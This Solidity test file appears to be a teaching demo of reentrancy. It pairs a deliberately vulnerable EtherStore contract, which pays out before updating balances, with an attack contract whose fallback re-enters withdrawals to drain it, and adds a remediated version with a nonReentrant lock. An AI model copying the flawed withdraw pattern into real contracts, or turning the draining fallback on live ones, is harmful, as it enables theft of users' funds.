// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";

contract ContractTest is Test {
        EtherStore store;
        EtherStoreAttack attack;
        EtherStoreRemediated Remediated;
        EtherStoreAttack attackRemediated;
function setUp() public { 

        store = new EtherStore();
        attack = new EtherStoreAttack(address(store));
        Remediated = new EtherStoreRemediated();
        attackRemediated = new EtherStoreAttack(address(Remediated));
        vm.deal(address(store), 5 ether);  
        vm.deal(address(attack), 2 ether); 
        vm.deal(address(Remediated), 5 ether);  
        vm.deal(address(attackRemediated), 2 ether);  
    }

function testReentrancy() public {
        attack.Attack() ;
 
    }

function testRemediated() public {
        attackRemediated.Attack() ;
 
    }
}

contract EtherStore {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdrawFunds(uint256 _weiToWithdraw) public {
        require(balances[msg.sender] >= _weiToWithdraw);
        (bool send, ) = msg.sender.call{value: _weiToWithdraw}("");
        require(send, "send failed");
        balances[msg.sender] -= _weiToWithdraw;
    }
}

contract EtherStoreAttack is DSTest { 
    EtherStore store;

    fallback() external payable {
        emit log_named_uint("EtherStore balance", address(store).balance);
        emit log_named_uint("Attacker balance", address(this).balance);
        if (address(store).balance > 1 ether) {
            store.withdrawFunds(1 ether);
        }
    }

    constructor(address _store) public {
        store = EtherStore(_store);
    }

    function Attack() public {   
        emit log_named_uint("Start Attack", address(store).balance);
        store.deposit{value: 1 ether}();  
        emit log_named_uint("Start Attack", address(store).balance);
        store.withdrawFunds(1 ether);
        emit log_named_uint("End of attack, EtherStore balance:", address(store).balance);
    }
}

contract EtherStoreRemediated {
    mapping(address => uint256) public balances;
    bool internal locked;

    modifier nonReentrant() {
        require(!locked, "No re-entrancy");
        locked = true;
        _;
        locked = false;
    }
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdrawFunds(uint256 _weiToWithdraw) public nonReentrant{
        require(balances[msg.sender] >= _weiToWithdraw);
        (bool send, ) = msg.sender.call{value: _weiToWithdraw}("");
        require(send, "send failed");
        balances[msg.sender] -= _weiToWithdraw;
    }
}